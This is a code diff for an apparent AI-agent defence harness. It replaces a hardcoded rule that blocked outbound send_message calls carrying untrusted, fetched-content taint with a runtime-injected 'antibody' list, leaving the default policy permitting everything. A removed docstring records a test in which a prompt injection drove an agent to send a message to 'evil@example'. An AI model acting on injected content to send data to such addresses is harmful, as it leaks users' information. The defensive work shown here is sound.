@@ -1,46 +1,40 @@
-from immunis.contracts.models import TaintTag, Trust
+"""Antibody matching mechanism. SOMA ships DEFENCELESS.
 
-POLICY_VERSION = 1
+No antibodies are defined or constructed here. active_antibodies is
+injected at runtime (tests, or a learned-promotion pipeline) and must be
+restored/cleared by whoever mutates it.
+"""
 
-def quarantine_required(tag: TaintTag) -> bool:
-    return tag.trust == Trust.untrusted
-
-
-# --- Antibody: block untrusted-content-driven exfiltration ---
-ANTIBODY_ID_EXFIL = "ab-block-exfil-untrusted-body"
-
-BLOCKED_EXFIL_REASON = (
-    "exfiltration: outbound send_message arguments carry untrusted taint "
-    "(fetched_content origin) - attacker-influenced destination or body"
-)
+from typing import Any
 
 
-def evaluate_tool_call(call):
-    """Return (permitted: bool, blocked_by: str|None, reason: str|None).
+active_antibodies: list = []  # injected at runtime; SOMA ships defenceless
 
-    First antibody: any send_message whose arguments carry untrusted taint
-    is blocked. Evidence: baseline run 211d707..5674894 - injection drove
-    send_message(to='evil@example') with permitted=True.
+
+def _matches(antibody: dict, call: Any) -> bool:
+    """Return True if the antibody's scope/condition covers this tool call.
+
+    Scope gates on tool name; the taint trace supplies the untrusted
+    evidence the condition keys on.
     """
-    from immunis.contracts.models import Trust
+    scope = antibody.get("scope")
+    if scope is not None and scope != getattr(call, "name", None):
+        return False
+    trace = getattr(call, "taint_trace", None) or {}
+    return any(
+        getattr(t, "trust", None) is not None
+        and getattr(t.trust, "value", t.trust) == "untrusted"
+        for t in trace.values()
+    )
 
-    if getattr(call, "name", None) != "send_message":
-        return True, None, None
 
-    taint_trace = getattr(call, "taint_trace", None) or {}
-    for t in taint_trace.values():
-        if t.trust == Trust.untrusted:
-            return False, ANTIBODY_ID_EXFIL, BLOCKED_EXFIL_REASON
+def evaluate_tool_call(call: Any) -> tuple[bool, str | None, str | None]:
+    """Evaluate a tool call against active_antibodies only.
 
-    return True, None, None
-
-    per_arg = _arg_taint(call)
-    tags = list(per_arg.values()) if per_arg else [_call_taint(call)]
-    tags = [t for t in tags if t is not None]
-
-    for t in tags:
-        trust = getattr(t, "trust", t)  # tolerate raw enums
-        if trust == Trust.untrusted:
-            return False, ANTIBODY_ID_EXFIL, BLOCKED_EXFIL_REASON
-
+    Returns (permitted, blocking_antibody_id, reason).
+    Empty policy -> everything is permitted.
+    """
+    for antibody in active_antibodies:
+        if antibody.get("action") == "block" and _matches(antibody, call):
+            return False, antibody["id"], f"blocked by {antibody['id']}"
     return True, None, None
